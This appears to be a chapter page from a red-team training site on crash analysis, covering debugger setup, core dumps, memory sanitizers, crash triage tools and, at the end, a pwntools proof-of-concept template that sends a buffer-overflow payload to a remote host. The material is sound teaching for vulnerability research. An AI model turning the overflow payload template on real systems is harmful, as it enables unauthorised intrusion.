<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chapter 5: Crash Analysis | Bitácora Red Team</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600;700&family=Source+Code+Pro:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
:root {
    /* Hacker Red Team Color Palette */
    --crimson-dark: #8B0000;
    --crimson: #DC143C;
    --crimson-light: #FF2442;
    --crimson-glow: rgba(220, 20, 60, 0.6);
    
    /* Grays */
    --gray-900: #0a0a0a;
    --gray-800: #1a1a1a;
    --gray-700: #2d2d2d;
    --gray-600: #404040;
    --gray-500: #525252;
    --gray-400: #737373;
    --gray-300: #a3a3a3;
    --gray-200: #d4d4d4;
    --gray-100: #f5f5f5;
    --white: #ffffff;
    
    /* Accent colors */
    --accent-red: #ff4444;
    --accent-orange: #ff6b35;
    --matrix-green: #00ff41;
    --terminal-green: #39ff14;
    
    /* Typography */
    --font-mono: 'Fira Code', 'JetBrains Mono', 'Source Code Pro', monospace;
    
    /* Sizing */
    --sidebar-width: 280px;
    --header-height: 70px;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html {
    scroll-behavior: smooth;
}

body {
    font-family: var(--font-mono);
    background: var(--gray-900);
    color: var(--gray-200);
    line-height: 1.8;
    min-height: 100vh;
    overflow-x: hidden;
}

/* Background with cover image */
.page-background {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -2;
    background: 
        linear-gradient(135deg, rgba(10, 10, 10, 0.95) 0%, rgba(26, 26, 26, 0.9) 50%, rgba(45, 45, 45, 0.85) 100%),
        url('images/image-000.jpg');
    background-size: cover;
    background-position: center;
    background-attachment: fixed;
}

/* Scanline effect */
.page-background::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(
        0deg,
        rgba(0, 0, 0, 0.1) 0px,
        rgba(0, 0, 0, 0.1) 1px,
        transparent 1px,
        transparent 3px
    );
    pointer-events: none;
    animation: scanlines 10s linear infinite;
}

@keyframes scanlines {
    0% { transform: translateY(0); }
    100% { transform: translateY(3px); }
}

/* Matrix rain effect (subtle) */
.matrix-rain {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
    pointer-events: none;
    opacity: 0.03;
    background: 
        linear-gradient(180deg, transparent 0%, var(--crimson) 100%),
        repeating-linear-gradient(
            0deg,
            transparent 0px,
            transparent 40px,
            var(--accent-red) 40px,
            var(--accent-red) 42px
        );
}

/* Header */
.main-header {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    height: var(--header-height);
    background: linear-gradient(180deg, rgba(10, 10, 10, 0.98) 0%, rgba(26, 26, 26, 0.95) 100%);
    backdrop-filter: blur(10px);
    border-bottom: 1px solid rgba(220, 20, 60, 0.3);
    z-index: 1000;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 30px;
}

.logo {
    display: flex;
    align-items: center;
    gap: 15px;
}

.logo-icon {
    width: 40px;
    height: 40px;
    background: linear-gradient(135deg, var(--crimson) 0%, var(--crimson-dark) 100%);
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.2rem;
    color: var(--white);
    box-shadow: 0 0 20px var(--crimson-glow);
}

.logo-text {
    font-size: 1.1rem;
    font-weight: 600;
    color: var(--white);
    letter-spacing: 1px;
}

.logo-text span {
    color: var(--crimson);
}

.header-controls {
    display: flex;
    align-items: center;
    gap: 20px;
}

.search-container {
    position: relative;
}

.search-input {
    background: rgba(45, 45, 45, 0.8);
    border: 1px solid rgba(220, 20, 60, 0.3);
    border-radius: 8px;
    padding: 8px 15px;
    padding-right: 40px;
    color: var(--gray-200);
    font-family: var(--font-mono);
    font-size: 0.85rem;
    width: 220px;
    transition: all 0.3s ease;
}

.search-input:focus {
    outline: none;
    border-color: var(--crimson);
    box-shadow: 0 0 15px rgba(220, 20, 60, 0.3);
    width: 280px;
}

.search-input::placeholder {
    color: var(--gray-500);
}

.search-btn {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    color: var(--gray-400);
    cursor: pointer;
    transition: color 0.3s ease;
}

.search-btn:hover {
    color: var(--crimson);
}

.language-switch {
    display: flex;
    align-items: center;
    gap: 10px;
}

.lang-btn {
    background: transparent;
    border: 1px solid var(--gray-600);
    color: var(--gray-300);
    padding: 6px 14px;
    border-radius: 6px;
    font-family: var(--font-mono);
    font-size: 0.75rem;
    cursor: pointer;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.lang-btn:hover, .lang-btn.active {
    background: var(--crimson);
    border-color: var(--crimson);
    color: var(--white);
    box-shadow: 0 0 15px var(--crimson-glow);
}

.menu-toggle {
    display: none;
    background: transparent;
    border: 1px solid var(--gray-600);
    color: var(--gray-200);
    padding: 8px 12px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 1rem;
}

/* Sidebar */
.sidebar {
    position: fixed;
    top: var(--header-height);
    left: 0;
    width: var(--sidebar-width);
    height: calc(100vh - var(--header-height));
    background: linear-gradient(180deg, rgba(10, 10, 10, 0.98) 0%, rgba(26, 26, 26, 0.95) 100%);
    border-right: 1px solid rgba(220, 20, 60, 0.2);
    overflow-y: auto;
    z-index: 900;
    padding: 30px 20px;
    transition: transform 0.3s ease;
}

.sidebar::-webkit-scrollbar {
    width: 6px;
}

.sidebar::-webkit-scrollbar-track {
    background: var(--gray-800);
}

.sidebar::-webkit-scrollbar-thumb {
    background: var(--gray-600);
    border-radius: 3px;
}

.sidebar::-webkit-scrollbar-thumb:hover {
    background: var(--crimson);
}

.sidebar-title {
    font-size: 0.7rem;
    text-transform: uppercase;
    letter-spacing: 3px;
    color: var(--gray-500);
    margin-bottom: 20px;
    padding-bottom: 10px;
    border-bottom: 1px solid rgba(220, 20, 60, 0.2);
}

.toc-link {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 12px 15px;
    color: var(--gray-300);
    text-decoration: none;
    border-radius: 8px;
    margin-bottom: 8px;
    transition: all 0.3s ease;
    font-size: 0.85rem;
}

.toc-link:hover {
    background: rgba(220, 20, 60, 0.1);
    color: var(--white);
    transform: translateX(5px);
}

.toc-link.active {
    background: linear-gradient(135deg, rgba(220, 20, 60, 0.2) 0%, rgba(220, 20, 60, 0.1) 100%);
    color: var(--crimson);
    border-left: 3px solid var(--crimson);
}

.chapter-num {
    font-size: 0.7rem;
    font-weight: 700;
    color: var(--crimson);
    background: rgba(220, 20, 60, 0.1);
    padding: 4px 8px: 4px;
    min-width;
    border-radius: 30px;
    text-align: center;
}

.chapter-title {
    flex: 1;
    line-height: 1.3;
}

.sidebar-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.7);
    z-index: 850;
}

/* Main content */
.main-content {
    margin-left: var(--sidebar-width);
    margin-top: var(--header-height);
    min-height: calc(100vh - var(--header-height));
    padding: 40px 50px;
}

.content-wrapper {
    max-width: 900px;
    margin: 0 auto;
}

/* Content area styling */
.content-area {
    background: linear-gradient(135deg, rgba(26, 26, 26, 0.95) 0%, rgba(45, 45, 45, 0.9) 100%);
    border: 1px solid rgba(220, 20, 60, 0.2);
    border-radius: 16px;
    padding: 50px;
    box-shadow: 
        0 10px 40px rgba(0, 0, 0, 0.5),
        0 0 30px rgba(220, 20, 60, 0.1);
    backdrop-filter: blur(10px);
}

.content-area h1 {
    font-size: 2.2rem;
    color: var(--white);
    margin-bottom: 30px;
    padding-bottom: 15px;
    border-bottom: 2px solid var(--crimson);
    text-shadow: 0 0 20px var(--crimson-glow);
}

.content-area h2 {
    font-size: 1.6rem;
    color: var(--crimson);
    margin-top: 40px;
    margin-bottom: 20px;
    padding-left: 15px;
    border-left: 3px solid var(--crimson);
}

.content-area h3 {
    font-size: 1.3rem;
    color: var(--gray-100);
    margin-top: 30px;
    margin-bottom: 15px;
}

.content-area h4 {
    font-size: 1.1rem;
    color: var(--gray-300);
    margin-top: 25px;
    margin-bottom: 10px;
}

.content-area p {
    margin-bottom: 20px;
    color: var(--gray-200);
    text-align: justify;
}

.content-area a {
    color: var(--crimson);
    text-decoration: none;
    transition: all 0.3s ease;
    border-bottom: 1px solid transparent;
}

.content-area a:hover {
    color: var(--crimson-light);
    border-bottom-color: var(--crimson-light);
    text-shadow: 0 0 10px var(--crimson-glow);
}

.content-area ul, .content-area ol {
    margin-bottom: 20px;
    padding-left: 30px;
}

.content-area li {
    margin-bottom: 10px;
    color: var(--gray-200);
}

.content-area li::marker {
    color: var(--crimson);
}

/* Code blocks */
.content-area code {
    font-family: var(--font-mono);
    background: rgba(220, 20, 60, 0.1);
    color: var(--crimson-light);
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 0.9em;
}

.content-area pre {
    background: var(--gray-900);
    border: 1px solid rgba(220, 20, 60, 0.3);
    border-radius: 8px;
    padding: 20px;
    overflow-x: auto;
    margin: 20px 0;
    box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
}

.content-area pre code {
    background: none;
    padding: 0;
    color: var(--terminal-green);
    font-size: 0.85rem;
    line-height: 1.6;
}

/* Tables */
.content-area table {
    width: 100%;
    border-collapse: collapse;
    margin: 25px 0;
    font-size: 0.9rem;
}

.content-area th {
    background: linear-gradient(135deg, var(--crimson-dark) 0%, var(--crimson) 100%);
    color: var(--white);
    padding: 15px;
    text-align: left;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
    font-size: 0.8rem;
}

.content-area td {
    padding: 12px 15px;
    border-bottom: 1px solid rgba(220, 20, 60, 0.1);
    color: var(--gray-200);
}

.content-area tr:hover {
    background: rgba(220, 20, 60, 0.05);
}

.content-area tr:nth-child(even) {
    background: rgba(45, 45, 45, 0.3);
}

/* Search highlight */
.search-highlight {
    background: var(--crimson);
    color: var(--white);
    padding: 2px 6px;
    border-radius: 3px;
    box-shadow: 0 0 10px var(--crimson-glow);
}

.no-results {
    text-align: center;
    padding: 40px;
    color: var(--gray-400);
    font-size: 1.1rem;
    display: none;
}

.no-results i {
    font-size: 2rem;
    margin-bottom: 15px;
    color: var(--crimson);
}

/* Navigation buttons */
.nav-buttons {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 40px;
    padding-top: 30px;
    border-top: 1px solid rgba(220, 20, 60, 0.2);
}

.nav-btn {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 12px 25px;
    background: linear-gradient(135deg, rgba(220, 20, 60, 0.2) 0%, rgba(220, 20, 60, 0.1) 100%);
    border: 1px solid rgba(220, 20, 60, 0.3);
    border-radius: 8px;
    color: var(--gray-200);
    text-decoration: none;
    font-size: 0.85rem;
    transition: all 0.3s ease;
}

.nav-btn:hover {
    background: linear-gradient(135deg, var(--crimson) 0%, var(--crimson-dark) 100%);
    border-color: var(--crimson);
    color: var(--white);
    box-shadow: 0 0 20px var(--crimson-glow);
    transform: translateY(-2px);
}

.nav-btn i {
    transition: transform 0.3s ease;
}

.nav-btn:hover i {
    transform: scale(1.2);
}

.nav-prev i {
    margin-right: 5px;
}

.nav-next i {
    margin-left: 5px;
}

.nav-home {
    background: linear-gradient(135deg, rgba(45, 45, 45, 0.8) 0%, rgba(26, 26, 26, 0.8) 100%);
    border-color: var(--gray-600);
}

.nav-home:hover {
    background: linear-gradient(135deg, var(--gray-600) 0%, var(--gray-700) 100%);
    border-color: var(--gray-400);
    box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
}

/* Footer */
.page-footer {
    text-align: center;
    padding: 30px;
    color: var(--gray-500);
    font-size: 0.8rem;
    border-top: 1px solid rgba(220, 20, 60, 0.1);
    margin-top: 50px;
}

.page-footer a {
    color: var(--crimson);
    text-decoration: none;
}

.page-footer a:hover {
    text-shadow: 0 0 10px var(--crimson-glow);
}

/* Animations */
@keyframes fadeInUp {
    from {
        opacity: 0;
        transform: translateY(30px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes pulse {
    0%, 100% {
        opacity: 1;
    }
    50% {
        opacity: 0.5;
    }
}

@keyframes glow {
    0%, 100% {
        box-shadow: 0 0 20px var(--crimson-glow);
    }
    50% {
        box-shadow: 0 0 40px var(--crimson-glow), 0 0 60px var(--crimson-glow);
    }
}

.logo-icon {
    animation: glow 3s ease-in-out infinite;
}

/* Responsive */
@media (max-width: 1024px) {
    .sidebar {
        transform: translateX(-100%);
    }
    
    .sidebar.active {
        transform: translateX(0);
    }
    
    .sidebar-overlay.active {
        display: block;
    }
    
    .main-content {
        margin-left: 0;
        padding: 30px 20px;
    }
    
    .menu-toggle {
        display: block;
    }
    
    .search-input {
        width: 150px;
    }
    
    .search-input:focus {
        width: 200px;
    }
}

@media (max-width: 768px) {
    .main-header {
        padding: 0 15px;
    }
    
    .logo-text {
        display: none;
    }
    
    .search-container {
        display: none;
    }
    
    .language-switch {
        gap: 5px;
    }
    
    .lang-btn {
        padding: 5px 10px;
        font-size: 0.65rem;
    }
    
    .content-area {
        padding: 30px 20px;
    }
    
    .content-area h1 {
        font-size: 1.6rem;
    }
    
    .content-area h2 {
        font-size: 1.3rem;
    }
    
    .content-area h3 {
        font-size: 1.1rem;
    }
    
    .nav-buttons {
        flex-wrap: wrap;
        gap: 15px;
    }
    
    .nav-btn {
        flex: 1;
        justify-content: center;
        min-width: 100px;
    }
}

@media (max-width: 480px) {
    .content-area {
        padding: 20px 15px;
        border-radius: 12px;
    }
    
    .content-area h1 {
        font-size: 1.4rem;
    }
    
    .nav-buttons {
        flex-direction: column;
    }
    
    .nav-btn {
        width: 100%;
        justify-content: center;
    }
}

/* Print styles */
@media print {
    .page-background,
    .matrix-rain,
    .sidebar,
    .main-header,
    .nav-buttons {
        display: none !important;
    }
    
    .main-content {
        margin-left: 0;
        padding: 0;
    }
    
    .content-area {
        box-shadow: none;
        border: 1px solid #ccc;
    }
}
</style>
</head>
<body>
    <div class="page-background"></div>
    <div class="matrix-rain"></div>
    
    <!-- Header -->
    <header class="main-header">
        <div class="logo">
            <button class="menu-toggle" id="menu-toggle">
                <i class="fas fa-bars"></i>
            </button>
            <div class="logo-icon">
                <i class="fas fa-skull"></i>
            </div>
            <div class="logo-text">
                RED<span>TEAM</span> LOG
            </div>
        </div>
        
        <div class="header-controls">
            <div class="search-container">
                <input type="text" class="search-input" id="searchbar" placeholder="Search content...">
                <button class="search-btn" id="search-btn">
                    <i class="fas fa-search"></i>
                </button>
            </div>
            
            <div class="language-switch">
                <a href="../es/" class="lang-btn">Español</a>
            </div>
        </div>
    </header>
    
    <!-- Sidebar overlay for mobile -->
    <div class="sidebar-overlay"></div>
    
    <!-- Sidebar -->
    <nav class="sidebar">
        <div class="sidebar-title">Chapters</div>
        <a href="01-introduction.html" class="toc-link ">
            <span class="chapter-num">01</span>
            <span class="chapter-title">Introduction</span>
        </a><a href="02-vulnerability-classes.html" class="toc-link ">
            <span class="chapter-num">02</span>
            <span class="chapter-title">Vulnerability Classes</span>
        </a><a href="03-fuzzing.html" class="toc-link ">
            <span class="chapter-num">03</span>
            <span class="chapter-title">Fuzzing</span>
        </a><a href="04-patch-diffing.html" class="toc-link ">
            <span class="chapter-num">04</span>
            <span class="chapter-title">Patch Diffing</span>
        </a><a href="05-crash-analysis.html" class="toc-link ">
            <span class="chapter-num">05</span>
            <span class="chapter-title">Crash Analysis</span>
        </a>
    </nav>
    
    <!-- Main Content -->
    <main class="main-content">
        <div class="content-wrapper">
            <article class="content-area">
                <h1>Chapter 5: Crash Analysis</h1>
<p>After finding potential vulnerabilities through fuzzing or patch diffing, the next critical step is to analyze crashes to determine if they are exploitable. This chapter covers crash triage, debugger mastery, memory sanitizers, and advanced root cause analysis techniques.</p>
<h2>5.1. 4.1 Crash Analysis Fundamentals</h2>
<p>Crash analysis is the process of transforming a crash discovered by a fuzzer into actionable knowledge about a vulnerability. This includes determining the root cause, assessing exploitability, and developing proofs of concept.</p>
<h3>5.1.1. Decision Tree for Crash Analysis</h3>
<ol>
<li><strong>CRASH RECEIVED:</strong> Is it reproducible?</li>
<li><strong>SOURCE CODE:</strong> Is it available?</li>
<li><strong>SANITIZERS:</strong> Recompile with ASAN/UBSAN if there is source code.</li>
<li><strong>DEBUGGER:</strong> Use GDB/WinDbg if there is no source code.</li>
<li><strong>CLASSIFY:</strong> Use CASR to classify the vulnerability.</li>
<li><strong>MINIMIZE:</strong> Reduce the crash input.</li>
<li><strong>PoC:</strong> Develop a proof of concept.</li>
</ol>
<h2>5.2. 4.2 Debuggers and Configuration</h2>
<h3>5.2.1. WinDbg Preview for Windows</h3>
<p>WinDbg Preview is the standard debugger for crash analysis in Windows, with advanced Time Travel Debugging capabilities.</p>
<p><strong>Installation:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c"># Install from Microsoft Store or winget</span>
<span class="n">winget</span> <span class="n">install</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">WinDbgPreview</span>

<span class="c"># Create symbols directory</span>
<span class="n">mkdir</span> <span class="n">C</span><span class="p">:\</span><span class="n">Symbols</span>

<span class="c"># Configure symbol path</span>
<span class="no">[Environment]</span><span class="p">::</span><span class="n">SetEnvironmentVariable</span><span class="p">(</span>
    <span class="s2">&quot;NT_SYMBOL_PATH&quot;</span><span class="p">,</span>
    <span class="s2">&quot;SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols&quot;</span><span class="p">,</span>
    <span class="s2">&quot;User&quot;</span>
<span class="p">)</span>
</code></pre></div>

<p><strong>Essential WinDbg Commands:</strong></p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>!analyze -v</td>
<td>Automatic crash analysis</td>
<td>N/A</td>
</tr>
<tr>
<td>k / kp / kv</td>
<td>Stack trace</td>
<td>kv 20</td>
</tr>
<tr>
<td>r</td>
<td>Show registers</td>
<td>r rax, rbx</td>
</tr>
<tr>
<td>u / ub</td>
<td>Disassembly</td>
<td>u rip L10</td>
</tr>
<tr>
<td>d / db / dq</td>
<td>Memory dump</td>
<td>dq rsp L8</td>
</tr>
<tr>
<td>!heap</td>
<td>Heap analysis</td>
<td>!heap -s</td>
</tr>
<tr>
<td>!address</td>
<td>Memory info</td>
<td>!address rsp</td>
</tr>
<tr>
<td>lm</td>
<td>List modules</td>
<td>lm vm ntdll</td>
</tr>
<tr>
<td>.ecxr</td>
<td>Exception context</td>
<td>N/A</td>
</tr>
</tbody>
</table>
<p><strong>Time Travel Debugging (TTD):</strong>
TTD allows recording the full execution of a process and replaying it.</p>
<div class="codehilite"><pre><span></span><code><span class="c"># Record execution</span>
<span class="n">tttracer</span><span class="p">.</span><span class="n">exe</span> <span class="n">-out</span> <span class="n">C</span><span class="p">:\</span><span class="n">Traces</span> <span class="n">-launch</span> <span class="n">target</span><span class="p">.</span><span class="n">exe</span> <span class="n">crash_input</span><span class="p">.</span><span class="n">txt</span>

<span class="c"># TTD commands</span>
<span class="p">!</span><span class="n">tt</span> <span class="n">0</span>           <span class="c"># Go to start</span>
<span class="p">!</span><span class="n">tt</span> <span class="n">100</span>         <span class="c"># Go to end</span>
<span class="n">g</span><span class="p">-</span>              <span class="c"># Run backwards</span>
<span class="n">p</span><span class="p">-</span>              <span class="c"># Step back</span>
</code></pre></div>

<h3>5.2.2. GDB + Pwndbg for Linux</h3>
<p>Pwndbg is a GDB extension designed for vulnerability analysis.</p>
<p><strong>Installation:</strong></p>
<div class="codehilite"><pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/pwndbg/pwndbg
<span class="nb">cd</span><span class="w"> </span>pwndbg
./setup.sh
pip<span class="w"> </span>install<span class="w"> </span>pwntools<span class="w"> </span>ropper<span class="w"> </span>capstone<span class="w"> </span>keystone-engine
</code></pre></div>

<p><strong>Core Dump Configuration:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nb">ulimit</span><span class="w"> </span>-c<span class="w"> </span>unlimited
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;core. %e. %p. %t&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/proc/sys/kernel/core_pattern
</code></pre></div>

<p><strong>Essential Pwndbg Commands:</strong></p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td>context</td>
<td>Show complete context</td>
</tr>
<tr>
<td>checksec</td>
<td>Verify protections</td>
</tr>
<tr>
<td>vmmap</td>
<td>Memory map</td>
</tr>
<tr>
<td>telescope</td>
<td>Smart dereference</td>
</tr>
<tr>
<td>cyclic</td>
<td>Generate/search patterns</td>
</tr>
<tr>
<td>search</td>
<td>Search in memory</td>
</tr>
<tr>
<td>heap</td>
<td>Heap analysis</td>
</tr>
<tr>
<td>rop</td>
<td>Find ROP gadgets</td>
</tr>
</tbody>
</table>
<p><strong>Typical Usage:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>~/crash_analysis_lab
gdb<span class="w"> </span>-q<span class="w"> </span>./vuln_no_protect
pwndbg&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>args<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="k">$(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;A&#39;*100)&quot;</span><span class="k">)</span>
pwndbg&gt;<span class="w"> </span>run
pwndbg&gt;<span class="w"> </span>context
pwndbg&gt;<span class="w"> </span>bt
pwndbg&gt;<span class="w"> </span>telescope<span class="w"> </span><span class="nv">$rsp</span><span class="w"> </span><span class="m">20</span>
</code></pre></div>

<h3>5.2.3. Dump Collection</h3>
<p><strong>Windows - ProcDump:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c"># Configure WER</span>
<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DumpFolder</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_EXPAND_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;C:\Dumps&quot;</span>
<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DumpType</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">2</span>

<span class="c"># Capture dump</span>
<span class="n">procdump</span> <span class="n">-e</span> <span class="n">-ma</span> <span class="n">target</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="n">C</span><span class="p">:\</span><span class="n">Dumps</span>
</code></pre></div>

<p><strong>Linux - Core Dumps:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Enable</span>
<span class="nb">ulimit</span><span class="w"> </span>-c<span class="w"> </span>unlimited

<span class="c1"># Systemd-coredump</span>
sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>systemd-coredump
coredumpctl<span class="w"> </span>list
coredumpctl<span class="w"> </span>info<span class="w"> </span>MATCH
</code></pre></div>

<h3>5.2.4. PageHeap and AppVerifier (Windows)</h3>
<div class="codehilite"><pre><span></span><code><span class="c"># Enable PageHeap</span>
<span class="n">gflags</span> <span class="p">/</span><span class="n">p</span> <span class="p">/</span><span class="n">enable</span> <span class="n">target</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">full</span>

<span class="c"># With AppVerifier</span>
<span class="n">appverif</span><span class="p">.</span><span class="n">exe</span>
<span class="c"># Add application → Select checks (Heaps, Handles, Locks)</span>
</code></pre></div>

<h2>5.3. 4.3 Memory Sanitizers</h2>
<p>Sanitizers are instrumentation tools that detect memory bugs at runtime.</p>
<h3>5.3.1. AddressSanitizer (ASAN)</h3>
<p>ASAN detects memory errors such as overflows and use-after-free.</p>
<p><strong>Compilation:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># GCC</span>
gcc<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>address<span class="w"> </span>-fno-omit-frame-pointer<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_asan

<span class="c1"># Clang</span>
clang<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>address<span class="w"> </span>-fno-omit-frame-pointer<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_asan
</code></pre></div>

<p><strong>Detected Errors:</strong>
| Error | Description |
|-------|-------------|
| heap-buffer-overflow | Out-of-bounds write on heap |
| stack-buffer-overflow | Buffer overflow on stack |
| use-after-free | Access after free() |
| double-free | Double free |</p>
<h3>5.3.2. UndefinedBehaviorSanitizer (UBSAN)</h3>
<div class="codehilite"><pre><span></span><code>clang<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>undefined<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_ubsan
</code></pre></div>

<h3>5.3.3. MemorySanitizer (MSAN)</h3>
<div class="codehilite"><pre><span></span><code>clang<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>memory<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_msan
</code></pre></div>

<h3>5.3.4. ThreadSanitizer (TSAN)</h3>
<div class="codehilite"><pre><span></span><code>clang<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>thread<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_tsan
</code></pre></div>

<h2>5.4. 4.4 Automated Classification and Triage</h2>
<h3>CASR - Crash Analysis and Severity Reporter</h3>
<div class="codehilite"><pre><span></span><code>cargo<span class="w"> </span>install<span class="w"> </span>casr
casr<span class="w"> </span>crash_dump<span class="w"> </span>--output<span class="w"> </span>report.json
</code></pre></div>

<p><strong>Classification:</strong>
- EXPLOITABLE: RIP/EIP control
- PROBABLY_EXPLOITABLE: Out-of-bounds read
- NOT_EXPLOITABLE: Non-exploitable crash</p>
<h3>Crash Minimization</h3>
<div class="codehilite"><pre><span></span><code><span class="c1"># With AFL</span>
afl-tmin<span class="w"> </span>-i<span class="w"> </span>crash_input<span class="w"> </span>-o<span class="w"> </span>minimized_input<span class="w"> </span>--<span class="w"> </span>./target
</code></pre></div>

<h2>5.5. 4.5 Reachability Analysis</h2>
<h3>DynamoRIO + drcov</h3>
<div class="codehilite"><pre><span></span><code>drrun<span class="w"> </span>-t<span class="w"> </span>drcov<span class="w"> </span>--<span class="w"> </span>./target<span class="w"> </span>input.txt
</code></pre></div>

<h3>Intel Processor Trace</h3>
<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>intel-pt-decoder
intel-pt-decoder<span class="w"> </span>--input<span class="w"> </span>trace.pt<span class="w"> </span>--output<span class="w"> </span>trace.txt
</code></pre></div>

<h3>Frida</h3>
<div class="codehilite"><pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>frida-tools
frida-trace<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;*malloc*&quot;</span><span class="w"> </span>./target
</code></pre></div>

<h3>rr - Record and Replay</h3>
<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>rr
rr<span class="w"> </span>record<span class="w"> </span>./target<span class="w"> </span>input.txt
rr<span class="w"> </span>replay
</code></pre></div>

<h2>5.6. 4.6 PoC (Proof of Concept) Development</h2>
<h3>pwntools - Exploitation Framework</h3>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>

<span class="c1"># Connection</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;target.host&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
<span class="c1"># io = process(&#39;./vuln_binary&#39;)</span>

<span class="c1"># Offset to RIP</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>

<span class="c1"># Build payload</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
    <span class="n">p64</span><span class="p">(</span><span class="n">target_address</span><span class="p">)</span>
<span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

